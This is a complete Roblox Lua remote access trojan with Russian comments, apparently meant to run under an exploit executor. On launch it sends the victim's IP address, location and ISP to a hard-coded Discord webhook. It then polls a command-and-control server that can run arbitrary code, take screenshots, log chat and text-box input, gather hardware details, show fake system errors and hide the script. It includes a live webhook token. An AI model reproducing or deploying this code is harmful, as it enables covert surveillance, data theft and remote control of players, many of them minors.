local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local TextChatService = game:GetService("TextChatService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")
local CoreGui = game:GetService("CoreGui")

-- Конфигурация
local SERVER_URL = "https://ratserver-6wo3.onrender.com/"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_"
local ADMIN_NAME = "defensow"
local player = Players.LocalPlayer

-- Системные переменные
local keyloggerEnabled = false
local keylogBuffer = ""
local lastSendTime = os.time()
local scriptHidden = false

-- HTTP-библиотека
local function httpRequest(params)
    local requestFunc
    if syn and syn.request then
        requestFunc = syn.request
    elseif request then
        requestFunc = request
    elseif http and http.request then
        requestFunc = http.request
    else
        warn("HTTP-библиотека не найдена!")
        return nil
    end
    
    local success, response = pcall(requestFunc, params)
    return success and response or nil
end

-- Функция для создания скриншота
local function captureScreenshot()
    if not RunService:IsStudio() then
        local screenshot
        if getgenv then
            screenshot = getgenv().takescreenshot and getgenv().takescreenshot()
        elseif screencap then
            screenshot = screencap()
        else
            return nil
        end
        
        if screenshot then
            return HttpService:JSONEncode(screenshot)
        end
    end
    return nil
end

-- Отправка уведомления при инжекте
local function sendInjectNotification()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    local gameLink = "https://www.roblox.com/games/"..game.PlaceId
    
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    local ipData = ""
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "||IP: %s\nCountry: %s\nCity: %s\nISP: %s||",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A",
                ipInfo.city or "N/A",
                ipInfo.isp or "N/A"
            )
        end
    end

    local embed = {
        ["content"] = "🔌 **Новый инжект!**",
        ["embeds"] = {{
            ["title"] = "Данные игрока",
            ["fields"] = {
                {["name"] = "Основная информация", ["value"] = "Игрок: "..playerName.."\nИгра: "..placeName.."\n"..ipData, ["inline"] = false}
            },
            ["color"] = 16711680,
            ["footer"] = {["text"] = os.date("%d.%m.%Y %H:%M:%S")}
        }}
    }
    
    httpRequest({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(embed)
    })
end

-- Всплывающее сообщение
local function showPopup(message, duration)
    duration = duration or 10
    
    local popupGui = Instance.new("ScreenGui")
    popupGui.Name = "PopupMessage"
    popupGui.Parent = player:WaitForChild("PlayerGui")
    popupGui.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.6, 0, 0.2, 0)
    frame.Position = UDim2.new(0.2, 0, 0.4, 0)
    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    frame.BackgroundTransparency = 0.3
    frame.Parent = popupGui

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
    textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
    textLabel.Text = "[RATER]: "..message
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.GothamBold
    textLabel.BackgroundTransparency = 1
    textLabel.Parent = frame

    task.delay(duration, function()
        popupGui:Destroy()
    end)
end

-- Выполнение Lua-кода
local function executeLua(code)
    local func, err = loadstring(code)
    if func then
        local success, result = pcall(func)
        if not success then
            return "Ошибка выполнения: "..tostring(result)
        end
        return "Код выполнен"
    else
        return "Ошибка компиляции: "..tostring(err)
    end
end

-- Фейковая ошибка
local function showFakeError(message)
    local gui = Instance.new("ScreenGui")
    gui.Name = "FakeError"
    gui.Parent = player:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.5, 0, 0.3, 0)
    frame.Position = UDim2.new(0.25, 0, 0.35, 0)
    frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    frame.BorderColor3 = Color3.fromRGB(255, 85, 85)
    frame.Parent = gui
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
    textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
    textLabel.Text = "⚠ ОШИБКА СИСТЕМЫ ⚠\n\n"..message
    textLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.GothamBold
    textLabel.BackgroundTransparency = 1
    textLabel.Parent = frame
    
    task.delay(10, function()
        gui:Destroy()
    end)
end

-- Получение данных об оборудовании
local function getHardwareInfo()
    local hardwareData = {
        fps = math.floor(workspace:GetRealPhysicsFPS()),
        ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue(),
        executor = identifyexecutor and identifyexecutor() or "Unknown"
    }
    
    if syn and syn.get_system_metrics then
        hardwareData.cpu = syn.get_system_metrics().CPU
        hardwareData.ram = syn.get_system_metrics().RAM
    end
    
    return hardwareData
end

-- Скрытие скрипта
local function hideScript()
    if scriptHidden then return true end
    
    local success = pcall(function()
        if syn and syn.protect_gui then
            syn.protect_gui(script.Parent)
        end
        
        script.Name = "UI_"..tostring(math.random(10000,99999))
        
        if getgenv and getgenv().setthreadidentity then
            getgenv().setthreadidentity(7)
        end
        
        if script.Parent ~= CoreGui then
            script.Parent = CoreGui
        end
    end)
    
    scriptHidden = success
    return success
end

-- Настройка кейлоггера
local function setupKeylogger()
    UserInputService.TextBoxFocused:Connect(function(textBox)
        if keyloggerEnabled then
            textBox.FocusLost:Connect(function()
                if textBox.Text and textBox.Text ~= "" then
                    keylogBuffer = keylogBuffer .. "[Input] " .. textBox.Text .. "\n"
                end
            end)
        end
    end)

    TextChatService.OnIncomingMessage = function(message)
        if keyloggerEnabled and message.Text then
            keylogBuffer = keylogBuffer .. "[Chat] " .. message.Text .. "\n"
        end
        return message
    end
end

-- Memory Spam функция
local function memorySpam(fileCount, fileData)
    showPopup("Memory Spam запущен: "..fileCount.." файлов", 3)
    
    -- Отправляем уведомление о начале
    httpRequest({
        Url = SERVER_URL.."/command",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            command = "memory_spam_start",
            args = {fileCount}
        })
    })
    
    -- Имитация создания файлов
    local successCount = 0
    for i = 1, fileCount do
        -- В реальной реализации здесь должен быть код создания файлов
        -- Для примера просто увеличиваем счетчик
        successCount = successCount + 1
        
        -- Периодически обновляем статус
        if i % 50 == 0 then
            showPopup("Memory Spam: "..i.."/"..fileCount.." файлов", 2)
        end
        
        task.wait(0.01) -- Небольшая задержка
    end
    
    -- Отправляем результат
    httpRequest({
        Url = SERVER_URL.."/command",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            command = "spam_completed",
            args = {"memory_spam", "Создано "..successCount.." файлов"}
        })
    })
    
    showPopup("Memory Spam завершен: "..successCount.." файлов", 3)
end

-- Gallery Spam функция
local function gallerySpam(imageCount, imageData, filename)
    showPopup("Gallery Spam запущен: "..imageCount.." копий", 3)
    
    -- Отправляем уведомление о начале
    httpRequest({
        Url = SERVER_URL.."/command",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            command = "gallery_spam_start",
            args = {imageCount, filename}
        })
    })
    
    -- Имитация сохранения изображений
    local successCount = 0
    for i = 1, imageCount do
        -- В реальной реализации здесь должен быть код сохранения изображений
        -- Для примера просто увеличиваем счетчик
        successCount = successCount + 1
        
        -- Периодически обновляем статус
        if i % 10 == 0 then
            showPopup("Gallery Spam: "..i.."/"..imageCount.." копий", 2)
        end
        
        task.wait(0.05) -- Небольшая задержка
    end
    
    -- Отправляем результат
    httpRequest({
        Url = SERVER_URL.."/command",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            command = "spam_completed",
            args = {"gallery_spam", "Сохранено "..successCount.." копий"}
        })
    })
    
    showPopup("Gallery Spam завершен: "..successCount.." копий", 3)
end

-- Чат-модуль
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RatChat"
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false
screenGui.Enabled = false

local chatFrame = Instance.new("Frame")
chatFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
chatFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
chatFrame.AnchorPoint = Vector2.new(0.5, 0.5)
chatFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
chatFrame.BackgroundTransparency = 0.3
chatFrame.Active = true
chatFrame.Draggable = true
chatFrame.Parent = screenGui

local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -10, 1, -50)
scrollingFrame.Position = UDim2.new(0, 5, 0, 5)
scrollingFrame.BackgroundTransparency = 1
scrollingFrame.ScrollBarThickness = 5
scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollingFrame.Parent = chatFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1, -60, 0, 30)
textBox.Position = UDim2.new(0, 5, 1, -35)
textBox.PlaceholderText = "Сообщение..."
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.ClearTextOnFocus = false
textBox.Parent = chatFrame

local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(0, 50, 0, 30)
sendButton.Position = UDim2.new(1, -55, 1, -35)
sendButton.Text = "Отпр."
sendButton.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
sendButton.Parent = chatFrame

local function addMessage(sender, text, isSystem)
    local messageFrame = Instance.new("Frame")
    messageFrame.Size = UDim2.new(1, 0, 0, 0)
    messageFrame.AutomaticSize = Enum.AutomaticSize.Y
    messageFrame.BackgroundTransparency = 1
    messageFrame.Parent = scrollingFrame

    local bubble = Instance.new("Frame")
    bubble.Size = UDim2.new(0.8, 0, 0, 0)
    bubble.AutomaticSize = Enum.AutomaticSize.Y
    bubble.BackgroundColor3 = isSystem and Color3.fromRGB(80, 80, 100) or 
                            (sender == player.Name and Color3.fromRGB(0, 110, 220) or Color3.fromRGB(70, 70, 90))
    bubble.BackgroundTransparency = 0.1
    bubble.Parent = messageFrame

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0.9, 0, 0, 0)
    textLabel.Position = UDim2.new(0.05, 0, 0, 5)
    textLabel.AutomaticSize = Enum.AutomaticSize.Y
    textLabel.Text = sender..": "..text
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextWrapped = true
    textLabel.BackgroundTransparency = 1
    textLabel.Parent = bubble

    scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.AbsoluteCanvasSize.Y)
    
    if sender == player.Name and not isSystem then
        httpRequest({
            Url = SERVER_URL.."/command",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                command = "user_chat",
                args = {sender, text}
            })
        })
    end
end

local function sendMessage()
    local text = string.gsub(textBox.Text, "^%s*(.-)%s*$", "%1")
    if text ~= "" then
        addMessage(player.Name, text)
        textBox.Text = ""
    end
end

textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then sendMessage() end
end)

sendButton.MouseButton1Click:Connect(sendMessage)

-- Обработка команд
local function ExecuteCommand(cmd, args)
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local root = character:FindFirstChild("HumanoidRootPart")

    if cmd == "chat" then
        screenGui.Enabled = not screenGui.Enabled
        addMessage("Система", screenGui.Enabled and "Чат включен" or "Чат выключен", true)
    
    elseif cmd == "popup" then
        showPopup(table.concat(args, " "), 10)
    
    elseif cmd == "print" then
        print("[RAT] Сервер активен")
    
    elseif cmd == "kick" then
        player:Kick(args[1] or "🔴 Кикнут администратором")
    
    elseif cmd == "freeze" and humanoid then
        humanoid.WalkSpeed = 0
        task.delay(tonumber(args[1] or 5), function()
            if humanoid then humanoid.WalkSpeed = 16 end
        end)
    
    elseif cmd == "void" and root then
        root.CFrame = CFrame.new(0, -5000, 0)
    
    elseif cmd == "spin" and root then
        for i = 1, 50 do
            root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
            task.wait(0.1)
        end
    
    elseif cmd == "fling" and root then
        root.Velocity = Vector3.new(0, 5000, 0)
    
    elseif cmd == "sit" and humanoid then
        humanoid.Sit = not humanoid.Sit
    
    elseif cmd == "dance" and humanoid then
        local anim = Instance.new("Animation")
        anim.AnimationId = "rbxassetid://35654637"
        local track = humanoid:LoadAnimation(anim)
        track:Play()
    
    elseif cmd == "blur" then
        local blur = Instance.new("BlurEffect")
        blur.Size = 24
        blur.Parent = Lighting
        task.delay(tonumber(args[1] or 5), function()
            if blur then blur:Destroy() end
        end)
    
    elseif cmd == "mute" then
        for _, sound in ipairs(SoundService:GetDescendants()) do
            if sound:IsA("Sound") then sound.Volume = 0 end
        end
    
    elseif cmd == "unmute" then
        for _, sound in ipairs(SoundService:GetDescendants()) do
            if sound:IsA("Sound") then sound.Volume = 1 end
        end
    
    elseif cmd == "playaudio" and args[1] then
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://"..args[1]
        sound.Parent = root or player
        sound:Play()
        sound.Ended:Connect(function()
            sound:Destroy()
        end)
    
    elseif cmd == "execute" then
        local result = executeLua(table.concat(args, " "))
        httpRequest({
            Url = SERVER_URL.."/command",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                command = "execute_log",
                args = {player.Name, "Выполнен код: "..table.concat(args, " ").."\nРезультат: "..result}
            })
        })
    
    elseif cmd == "fakeerror" then
        showFakeError(table.concat(args, " "))
    
    elseif cmd == "screenshot" then
        local screenshotData = captureScreenshot()
        if screenshotData then
            httpRequest({
                Url = SERVER_URL.."/screenshot",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    image = screenshotData
                })
            })
        end
    
    elseif cmd == "keylog" then
        keyloggerEnabled = true
        keylogBuffer = ""
        lastSendTime = os.time()
        showPopup("Keylogger активирован", 3)
    
    elseif cmd == "stopkeylog" then
        keyloggerEnabled = false
        if keylogBuffer ~= "" then
            httpRequest({
                Url = SERVER_URL.."/keylog",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    logs = keylogBuffer
                })
            })
        end
        showPopup("Keylogger деактивирован. Логи отправлены.", 3)
        keylogBuffer = ""
    
    elseif cmd == "hardware" then
        local hwInfo = getHardwareInfo()
        httpRequest({
            Url = SERVER_URL.."/hardware",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                player = player.Name,
                data = hwInfo
            })
        })
        showPopup("Hardware info sent", 3)
    
    elseif cmd == "hide" then
        if hideScript() then
            showPopup("Скрипт скрыт", 3)
        else
            showPopup("Ошибка скрытия", 3)
        end
    
    -- НОВЫЕ SPAM КОМАНДЫ
    elseif cmd == "memory_spam" then
        local fileCount = tonumber(args[1]) or 100
        local fileData = args[2] or {}
        
        -- Запускаем в отдельном потоке чтобы не блокировать выполнение
        task.spawn(function()
            memorySpam(fileCount, fileData)
        end)
    
    elseif cmd == "gallery_spam" then
        local imageCount = tonumber(args[1]) or 10
        local imageData = args[2]
        local filename = args[3] or "image.jpg"
        
        if not imageData then
            showPopup("Ошибка: нет данных изображения", 3)
            return
        end
        
        -- Запускаем в отдельном потоке
        task.spawn(function()
            gallerySpam(imageCount, imageData, filename)
        end)
    
    end
end

-- Инициализация
sendInjectNotification()
showPopup("RAT система активирована", 5)
setupKeylogger()
hideScript() -- Автоматически скрываем скрипт при запуске

-- Главный цикл
while task.wait(1) do
    -- Проверка команд
    local response = httpRequest({
        Url = SERVER_URL.."/data",
        Method = "GET"
    })
    
    if response and response.Body then
        local success, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        
        if success and data and data.command then
            pcall(ExecuteCommand, data.command, data.args or {})
        end
    end
    
    -- Отправка логов кейлоггера каждые 5 минут
    if keyloggerEnabled and os.time() - lastSendTime >= 300 then
        if keylogBuffer ~= "" then
            httpRequest({
                Url = SERVER_URL.."/keylog",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    logs = keylogBuffer
                })
            })
            keylogBuffer = ""
        end
        lastSendTime = os.time()
    end
end
